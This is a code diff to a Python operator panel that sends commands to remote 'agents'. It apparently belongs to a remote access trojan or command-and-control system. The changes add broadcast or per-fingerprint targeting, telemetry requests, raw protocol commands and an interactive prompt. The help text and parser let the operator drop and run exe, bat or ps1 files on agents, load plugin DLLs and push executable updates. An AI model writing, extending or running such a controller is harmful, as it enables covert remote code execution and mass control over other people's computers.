@@ -14,8 +14,8 @@ import threading
 import time
 
 MAX_UPDATE_BYTES = 64 * 1024 * 1024
-
-MAX_PANEL_FRAME_BYTES = 64 * 1024
+MAX_CONTROL_COMMAND_BYTES = 3 * 1024 * 1024
+MAX_PANEL_FRAME_BYTES = MAX_CONTROL_COMMAND_BYTES + 64 * 1024
 PANEL_AUTH_DOMAIN = b"ZTSEC-PANEL-AUTH-V1\x00"
 PANEL_PROTOCOL_VERSION = 1
 
@@ -26,17 +26,21 @@ FIELDS = [
 ]
 
 HELP_TEXT = """Commands:
-  close / exit / quit        Disconnect the agent
-  reconnect                  Reconnect the agent
-  sleep / hibernate          Power commands
-  restart / shutdown         Power commands
-  load:<path>                Load a plugin DLL
-  unload:<id>                Unload a loaded plugin
-  event:<name>               Fire a plugin event
-  execute:<ext>:<path>       Drop and run a file on the agent
-                             ext: exe | bat | ps1
-  update:<path>              Send an executable update as raw file bytes
-  <path>                     Shorthand for load:<path>"""
+  target:<fingerprint|broadcast>  Select the command target
+  close                          Disconnect the selected agent(s)
+  reconnect                      Reconnect the selected agent(s)
+  sleep / hibernate              Power commands
+  restart / shutdown             Power commands
+  load:<path>                    Load a plugin DLL
+  unload:<id>                    Unload a loaded plugin
+  event:<name>                   Fire a plugin event
+  execute:<ext>:<path>           Drop and run a file on the agent
+                                 ext: exe | bat | ps1
+  update:<path>                  Send an executable update as raw file bytes
+  data                           Request telemetry from the selected agent(s)
+  send:<raw-command>             Send an exact supported protocol command
+  exit / quit                    Close the panel session
+  <path>                         Shorthand for load:<path>"""
 
 def read_line(s):
     b = bytearray()
@@ -98,6 +102,73 @@ def execute_cmd(ext, path):
         data = f.read()
     b64 = base64.b64encode(data).decode()
     return f"CMD:EXECUTE:{ext.lower()}:{b64}"
+
+
+def panel_command(target, command):
+    request_id = secrets.token_hex(8)
+    return {
+        "protocol_version": PANEL_PROTOCOL_VERSION,
+        "message_type": "agent_command",
+        "request_id": request_id,
+        "target": target,
+        "command": command.strip(),
+    }, request_id
+
+
+def _show_panel_event(event):
+    if event.get("message_type") == "telemetry":
+        telemetry = event.get("telemetry", {})
+        for name in FIELDS:
+            print(f"{name}: {telemetry.get(name, 'Unknown')}")
+        print("---")
+    elif event.get("message_type") != "panel_pong":
+        print(json.dumps(event, indent=2, sort_keys=True))
+
+
+def wait_panel_result(sock, request_id, timeout_seconds):
+    deadline = time.monotonic() + timeout_seconds
+    while True:
+        remaining = deadline - time.monotonic()
+        if remaining <= 0:
+            raise TimeoutError("timed out waiting for panel command result")
+        readable, _, _ = select.select([sock], [], [], min(1.0, remaining))
+        if not readable:
+            continue
+        event = _panel_recv(sock)
+        if event.get("message_type") == "agent_command_result" and event.get("request_id") == request_id:
+            return event
+        _show_panel_event(event)
+
+
+def parse_remote_command(text, target):
+    lc = text.lower()
+    if lc == "data":
+        return target, "REQ:DATA"
+    if lc == "close":
+        return target, "CMD:CLOSE"
+    if lc in {"reconnect", "sleep", "hibernate", "restart", "shutdown"}:
+        return target, f"CMD:{lc.upper()}"
+    if lc.startswith("unload:"):
+        return target, f"CMD:UNLOAD:{text.split(':', 1)[1].strip()}"
+    if lc.startswith("event:"):
+        return target, f"CMD:PLUGIN_EVENT:{text.split(':', 1)[1].strip()}"
+    if lc.startswith("load:"):
+        return target, plugin_cmd(text.split(":", 1)[1].strip())
+    if lc.startswith("update:"):
+        return target, update_cmd(text.split(":", 1)[1].strip())
+    if lc.startswith("execute:"):
+        rest = text.split(":", 2)
+        if len(rest) < 3 or rest[1].strip().lower() not in {"exe", "bat", "ps1"}:
+            raise ValueError("usage: execute:<exe|bat|ps1>:<path>")
+        return target, execute_cmd(rest[1].strip(), rest[2].strip())
+    if lc.startswith("send:"):
+        command = text.split(":", 1)[1].strip()
+        if not command:
+            raise ValueError("send requires a command")
+        return target, command
+    if os.path.isfile(text):
+        return target, plugin_cmd(text)
+    raise ValueError("unknown panel command; use --help or send:<raw-command>")
 
 
 def _read_panel_secret(path):
@@ -187,29 +258,42 @@ def remote_panel(args):
         authenticated = _panel_recv(sock)
         if authenticated.get("message_type") != "panel_authenticated":
             raise PermissionError("panel authentication failed")
-        print("authenticated")
-        next_ping = time.monotonic() + 30
+        print(f"authenticated; target={args.target}")
         while True:
-            wait = max(0.1, min(1.0, next_ping - time.monotonic()))
-            readable, _, _ = select.select([sock], [], [], wait)
-            if readable:
-                event = _panel_recv(sock)
-                if event.get("message_type") == "telemetry":
-                    telemetry = event.get("telemetry", {})
-                    for name in FIELDS:
-                        print(f"{name}: {telemetry.get(name, 'Unknown')}")
-                    print("---")
-                elif event.get("message_type") != "panel_pong":
-                    print(json.dumps(event, indent=2, sort_keys=True))
-            if time.monotonic() >= next_ping:
-                _panel_send(sock, {"protocol_version": PANEL_PROTOCOL_VERSION, "message_type": "panel_ping"})
-                next_ping = time.monotonic() + 30
+            try:
+                command = input(f"panel[{args.target}]> ").strip()
+            except (EOFError, KeyboardInterrupt):
+                return
+            if not command:
+                continue
+            if command.lower() in {"--help", "help"}:
+                print(HELP_TEXT)
+                continue
+            if command.lower().startswith("target:"):
+                candidate = command.split(":", 1)[1].strip()
+                if candidate.lower() == "broadcast" or (len(candidate) == 64 and all(c in "0123456789abcdefABCDEF" for c in candidate)):
+                    args.target = candidate
+                    print(f"target={args.target}")
+                else:
+                    print("error: target must be broadcast or a 64-hex agent fingerprint")
+                continue
+            if command.lower() in {"exit", "quit"}:
+                return
+            try:
+                target, raw_command = parse_remote_command(command, args.target)
+                request, request_id = panel_command(target, raw_command)
+                _panel_send(sock, request)
+                result = wait_panel_result(sock, request_id, args.timeout)
+                print(json.dumps(result, indent=2, sort_keys=True))
+            except (OSError, ValueError, TimeoutError, ConnectionError) as exc:
+                print(f"error: {exc}")
     finally:
         try:
             _panel_send(sock, {"protocol_version": PANEL_PROTOCOL_VERSION, "message_type": "panel_close"})
         except OSError:
             pass
         sock.close()
+
 
 def main():
     ap = argparse.ArgumentParser()
@@ -219,6 +303,7 @@ def main():
     ap.add_argument("--remote-server-name", dest="server_name", help="TLS server name/IP SAN; defaults to remote host")
     ap.add_argument("--remote-secret-file", dest="secret_file", help="local file containing the 32-character panel secret")
     ap.add_argument("--remote-panel-id", dest="panel_id", default="panel-01")
+    ap.add_argument("--remote-target", dest="target", default="broadcast", help="default agent fingerprint or broadcast target")
     ap.add_argument("--remote-timeout", dest="timeout", type=float, default=8.0)
     ap.add_argument("--generate-remote-secret", metavar="PATH", help="generate a new 32-character local panel secret")
     ap.add_argument("--ip", default="127.0.0.1")
